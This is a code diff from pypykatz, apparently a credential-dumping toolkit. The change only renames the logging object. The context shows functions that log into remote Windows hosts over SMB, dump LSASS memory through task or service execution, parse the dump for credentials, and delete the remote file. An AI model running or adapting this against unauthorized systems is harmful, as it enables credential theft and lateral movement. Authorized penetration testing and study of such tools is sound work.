@@ -20,7 +20,7 @@ def natatime(n, iterable, fillvalue = None):
 	return itertools.zip_longest(*stepped_slices, fillvalue = fillvalue)
 
 
-from pypykatz import logging
+from pypykatz import logger
 
 async def lsassfile(url, packages = ['all'], chunksize = 64*1024):
 	from aiosmb.commons.connection.url import SMBConnectionURL
@@ -32,21 +32,21 @@ async def lsassfile(url, packages = ['all'], chunksize = 64*1024):
 	smbfile = smburl.get_file()
 
 	async with connection:
-		logging.debug('[LSASSFILE] Connecting to server...')
+		logger.debug('[LSASSFILE] Connecting to server...')
 		_, err = await connection.login()
 		if err is not None:
 			raise err
 		
-		logging.debug('[LSASSFILE] Connected!')
-		logging.debug('[LSASSFILE] Opening LSASS dump file...')
+		logger.debug('[LSASSFILE] Connected!')
+		logger.debug('[LSASSFILE] Opening LSASS dump file...')
 		_, err = await smbfile.open(connection)
 		if err is not None:
 			raise err
 		
-		logging.debug('[LSASSFILE] LSASS file opened!')
-		logging.debug('[LSASSFILE] parsing LSASS file...')
+		logger.debug('[LSASSFILE] LSASS file opened!')
+		logger.debug('[LSASSFILE] parsing LSASS file...')
 		mimi = await apypykatz.parse_minidump_external(SMBFileReader(smbfile), chunksize=chunksize, packages = packages)
-		logging.debug('[LSASSFILE] LSASS file parsed OK!')
+		logger.debug('[LSASSFILE] LSASS file parsed OK!')
 		return mimi
 
 async def lsassdump(url, method = 'task', remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\',chunksize = 64*1024, packages = ['all'], targets = [], worker_cnt = 5):
@@ -147,14 +147,14 @@ async def lsassdump_single(targetid, connection, method = 'task', remote_base_pa
 
 		mimi = None
 		async with connection:
-			logging.debug('[LSASSDUMP][%s] Connecting to server...' % targetid)
+			logger.debug('[LSASSDUMP][%s] Connecting to server...' % targetid)
 			_, err = await connection.login()
 			if err is not None:
 				raise err
-			logging.debug('[LSASSDUMP][%s] Connected!' % targetid)
+			logger.debug('[LSASSDUMP][%s] Connected!' % targetid)
 			async with SMBMachine(connection) as machine:
 				if method == 'task':
-					logging.debug('[LSASSDUMP][%s] Start dumping LSASS with taskexec method!' % targetid)
+					logger.debug('[LSASSDUMP][%s] Start dumping LSASS with taskexec method!' % targetid)
 					smbfile_inner, err = await machine.task_dump_lsass()
 					
 					if err is not None:
@@ -162,22 +162,22 @@ async def lsassdump_single(targetid, connection, method = 'task', remote_base_pa
 					
 					smbfile = SMBFileReader(smbfile_inner)
 					
-					#logging.debug('[LSASSDUMP][%s] Start dumping LSASS with taskexec method!' % targetid)
-					#logging.info('[LSASSDUMP][%s] File location: %s' % (targetid,filepath))
+					#logger.debug('[LSASSDUMP][%s] Start dumping LSASS with taskexec method!' % targetid)
+					#logger.info('[LSASSDUMP][%s] File location: %s' % (targetid,filepath))
 					#_, err = await machine.tasks_execute_commands(commands)
 					#if err is not None:
 					#	raise err
 					#
-					#logging.debug('[LSASSDUMP][%s] Opening LSASS dump file...' % targetid)
+					#logger.debug('[LSASSDUMP][%s] Opening LSASS dump file...' % targetid)
 					#for _ in range(5):
-					#	logging.debug('[LSASSDUMP][%s] Sleeping a bit to let the remote host finish dumping' % targetid)
+					#	logger.debug('[LSASSDUMP][%s] Sleeping a bit to let the remote host finish dumping' % targetid)
 					#	await asyncio.sleep(5)
 					#	smbfile = SMBFileReader(SMBFile.from_remotepath(connection, filesharepath))
 					#	_, err = await smbfile.open(connection)
 					#	if err is not None:
 					#		if isinstance(err, SMBException):
 					#			if err.ntstatus == NTStatus.SHARING_VIOLATION:
-					#				logging.debug('[LSASSDUMP][%s] LSASS dump is not yet ready, retrying...' % targetid)
+					#				logger.debug('[LSASSDUMP][%s] LSASS dump is not yet ready, retrying...' % targetid)
 					#				#await asyncio.sleep(1)
 					#				continue
 					#		raise err
@@ -188,7 +188,7 @@ async def lsassdump_single(targetid, connection, method = 'task', remote_base_pa
 				
 				
 				elif method == 'service':
-					logging.debug('[LSASSDUMP][%s] Start dumping LSASS with serviceexec method!' % targetid)
+					logger.debug('[LSASSDUMP][%s] Start dumping LSASS with serviceexec method!' % targetid)
 					smbfile_inner, err = await machine.service_dump_lsass()
 					
 					if err is not None:
@@ -198,12 +198,12 @@ async def lsassdump_single(targetid, connection, method = 'task', remote_base_pa
 				else:
 					raise Exception('Unknown execution method %s' % method)
 			
-			logging.debug('[LSASSDUMP][%s] LSASS dump file opened!' % targetid)
-			logging.debug('[LSASSDUMP][%s] parsing LSASS dump file on the remote host...' % targetid)
+			logger.debug('[LSASSDUMP][%s] LSASS dump file opened!' % targetid)
+			logger.debug('[LSASSDUMP][%s] parsing LSASS dump file on the remote host...' % targetid)
 			mimi = await apypykatz.parse_minidump_external(smbfile, chunksize=chunksize, packages = packages)
 
-			logging.debug('[LSASSDUMP][%s] parsing OK!' % targetid)
-			logging.debug('[LSASSDUMP][%s] Deleting remote dump file...' % targetid)
+			logger.debug('[LSASSDUMP][%s] parsing OK!' % targetid)
+			logger.debug('[LSASSDUMP][%s] Deleting remote dump file...' % targetid)
 			_, err = await smbfile.delete()
 			if err is not None:
 				print('[%s] Failed to delete LSASS file! Reason: %s' % (targetid, err))
